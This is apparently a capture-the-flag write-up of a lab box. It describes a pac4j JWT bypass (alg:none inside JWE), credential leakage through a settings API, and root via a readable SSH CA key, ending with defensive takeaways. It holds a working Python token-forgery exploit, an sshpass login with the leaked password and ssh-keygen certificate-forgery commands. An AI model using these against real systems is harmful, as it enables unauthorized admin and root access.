CVE-2026-29000 → plaintext creds in API → SSH CA forgery → root

overview

The box runs a Java web application fronted by pac4j's JWT authenticator. A recent critical vulnerability in the library allows an attacker to wrap a completely unsigned alg:none JWT inside a valid JWE envelope, bypassing signature verification entirely. From there the dashboard hands over an encryption key and SSH CA path in plaintext — credentials that chain directly into root via SSH certificate forgery.

recon

Started with a comprehensive nmap scan — version detection, default scripts, and OS fingerprinting all at once: 

sudo nmap -sS -sV -sC -O -oN nmap.txt $box

The flags in brief: -sS is a SYN scan (fast, stealthy, doesn't complete the TCP handshake), -sV probes service banners for version strings, -sC runs the default script set (grabs headers, checks common misconfigs), -O attempts OS detection, and -oN writes a clean log for later reference. Two ports come back open.

portservicedetail
22/tcp ssh OpenSSH 9.6p1 on Ubuntu
8080/tcp http-proxy Jetty — redirects to /login

The response headers on port 8080 stopped me immediately. Buried in the 302 redirect to /login was a single line: 

X-Powered-By: pac4j-jwt/6.0.3

a server advertising its exact auth library and version in a response header is, charitably, a gift. CVE-2026-29000 is a CVSS 10.0 auth bypass in pac4j's JWT authenticator. i had a hunch immediately, but wanted to map the full surface first.

directory bruteforce

Default credentials (admin:admin, admin:password) went nowhere on the login page, and the HTML itself had nothing interesting. Time for gobuster: 

gobuster dir \
  -u "http://$box:8080" \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt \
  > gobuster.txt
pathstatusnote

Nothing immediately exploitable — but the /dashboard redirect was interesting. The server knows the route exists and returns a 200; it's client-side auth enforcement. That told me the API was worth examining more closely, so I pulled the page source.

client-side disclosure

The login page sources a single JS bundle at /static/js/app.js. What I found inside was genuinely remarkable — the entire authentication architecture documented in JSDoc comments, served publicly to any visitor: 

/**
 * Principal Internal Platform - Client Application
 *
 * Authentication flow:
 * 1. User submits credentials to /api/auth/login
 * 2. Server returns encrypted JWT (JWE) token
 * 3. Token is stored and sent as Bearer token for subsequent requests
 *
 * Token handling:
 * - Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM
 * - Public key available at /api/auth/jwks for token verification
 * - Inner JWT is signed with RS256
 *
 * JWT claims schema:
 *   sub   - username
 *   role  - one of: ROLE_ADMIN, ROLE_MANAGER, ROLE_USER
 *   iss   - "principal-platform"
 *   iat   - issued at (epoch)
 *   exp   - expiration (epoch)
 */

const JWKS_ENDPOINT      = '/api/auth/jwks';
const AUTH_ENDPOINT      = '/api/auth/login';
const DASHBOARD_ENDPOINT = '/api/dashboard';
const USERS_ENDPOINT     = '/api/users';
const SETTINGS_ENDPOINT  = '/api/settings';

const ROLES = {
  ADMIN:   'ROLE_ADMIN',
  MANAGER: 'ROLE_MANAGER',
  USER:    'ROLE_USER'
};

This is everything an attacker needs to forge a token: the JWE algorithm (RSA-OAEP-256 + A128GCM), the public key endpoint (/api/auth/jwks), the role claim names, and the full claims schema. Combined with a vulnerable version of pac4j, this is a complete exploit blueprint handed over before a single login attempt.

leaving architecture documentation in client-side JS is a significant risk even when there's no underlying vulnerability — paired with CVE-2026-29000 it becomes a step-by-step attack guide.

exploitation — CVE-2026-29000

how the vulnerability works

pac4j's JwtAuthenticator processes encrypted tokens in three stages: decrypt the outer JWE, parse the inner payload, then verify the inner JWT's signature. The bug lives in step three. After decryption, the library calls toSignedJWT() on the payload to extract a SignedJWT for verification. If the inner token is a PlainJWT — a JWT with "alg":"none" and no signature — this method returns null.

The vulnerable logic then checks if signedJWT is not None before running verification. Since it's null, the entire signature check is skipped. The library moves on, extracts claims from the payload anyway, and creates a fully authenticated session. An attacker only needs the server's public key to encrypt the outer JWE — which is served openly at /api/auth/jwks.

the exploit

import argparse, requests, base64, json, time
from jwcrypto import jwk, jwe


def b64url(s):
    return base64.urlsafe_b64encode(s.encode()).rstrip(b"=").decode()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True)
    args = parser.parse_args()

    # fetch server's public key — served openly, no auth required
    jwks_url = f"{args.target}/api/auth/jwks"
    key_data = requests.get(jwks_url).json()["keys"][0]
    pub_key  = jwk.JWK(**key_data)

    now = int(time.time())

    # inner token: alg:none (PlainJWT) — no signature, verification skipped
    header  = b64url('{"alg":"none"}')
    payload = b64url(json.dumps({
        "sub":  "admin",
        "role": "ROLE_ADMIN",
        "iss":  "principal-platform",
        "iat":  now,
        "exp":  now + 1337,
    }))
    plain_jwt = f"{header}.{payload}."   # empty signature segment

    # outer JWE: encrypted with the server's own public key
    token = jwe.JWE(
        plain_jwt.encode(),
        recipient=pub_key,
        protected={
            "alg": "RSA-OAEP-256",
            "enc": "A128GCM",
            "kid": key_data["kid"],
        },
    ).serialize(compact=True)

    print(token)


if __name__ == "__main__":
    main()

Running the script against the target produces a valid JWE token encoding an admin session — no credentials, no brute-force, no private key material. Drop it into sessionStorage under the key auth_token and navigate to /dashboard. The server accepts it without complaint. 

sessionStorage.setItem('auth_token', '')
// navigate to /dashboard

post-auth recon

users

The Users panel lists a handful of accounts. One entry stands out immediately: a service account named svc-deploy with the role deployer and a note reading "Service account for automated deployments via SSH certificate auth." Filed away — SSH cert auth is going to be relevant.

settings

The Settings panel is where things get loud. Under Security, a field labeled encryptionKey contains a value that is unmistakably a password: 

encryptionKey    D3pl0y_$$H_Now42!
tokenExpiry      3600s
sessionManagement  stateless

And under Infrastructure, the SSH CA configuration is spelled out in full: 

sshCaPath       /opt/principal/ssh/
sshCertAuth     enabled
database        H2 (embedded)
notes           SSH certificate auth configured for automation
                — see /opt/principal/ssh/ for CA config.

storing infrastructure secrets in an API endpoint that any authenticated user can reach — including one whose session was forged without credentials — is the kind of thing that turns a web vulnerability into a full system compromise.

user flag

The encryptionKey value is almost certainly the password for svc-deploy. One command confirms it: 

sshpass -p 'D3pl0y_$$H_Now42!' ssh svc-deploy@$box
svc-deploy@principal:~$ ls
user.txt
user user.txt

privilege escalation

the SSH CA directory

The settings page pointed us to /opt/principal/ssh/. Let's see what svc-deploy can actually read there: 

svc-deploy@principal:/opt/principal/ssh$ ls -la

drwxr-x--- 2 root deployers 4096 Mar 11 04:22 .
drwxr-xr-x 5 root root      4096 Mar 11 04:22 ..
-rw-r----- 1 root deployers  288 Mar  5 21:05 README.txt
-rw-r----- 1 root deployers 3381 Mar  5 21:05 ca          ← private key
-rw-r--r-- 1 root root       742 Mar  5 21:05 ca.pub

The CA private key is group-readable, and svc-deploy is in the deployers group. This is the misconfiguration that ends the box — the private key of a CA trusted by sshd should be accessible only to root. With read access to it, we can sign any certificate for any principal, including root.

forging the root certificate

Three commands from shell to root: 

# 1. generate a fresh keypair for ourselves
ssh-keygen -t rsa -f /tmp/haxor -N ""

# 2. sign our public key with the CA, claiming to be root
#    -I  = certificate identity (label)
#    -n  = principal (the account the cert is valid for)
#    -V  = validity window
ssh-keygen -s /opt/principal/ssh/ca \
           -I "stxrless" \
           -n root \
           -V +1h \
           /tmp/haxor.pub

# 3. authenticate with the signed certificate
ssh -i /tmp/haxor \
    -o CertificateFile=/tmp/haxor-cert.pub \
    root@localhost
root@principal:~# id
uid=0(root) gid=0(root) groups=0(root)
root@principal:~# cat root.txt
root root.txt

takeaways

Three independent failures stack here into a complete, credential-free root. Any one of them fixed in isolation would have stopped the chain — but all three have to coexist for the full compromise to land.

  • Patch pac4j. CVE-2026-29000 is a CVSS 10.0 auth bypass with public PoC. A library that accepts alg:none tokens wrapped in JWE has no business sitting in front of a production service.
  • Strip implementation details from client-side code. Documenting your JWT algorithm, claims schema, and API surface in a JS bundle served pre-auth is not a vulnerability on its own — but it eliminates every guessing step for an attacker who finds one.
  • Never store secrets in API responses. An encryption key (read: password) visible in /api/settings to any authenticated user — including a forged one — is not an encryption key. It's a footnote.
  • Lock down SSH CA private keys. A CA key readable by a service account is a root certificate factory. The private key should be owner-root, mode 600, full stop. Group-readable is the misconfiguration that turned user into root in two commands.
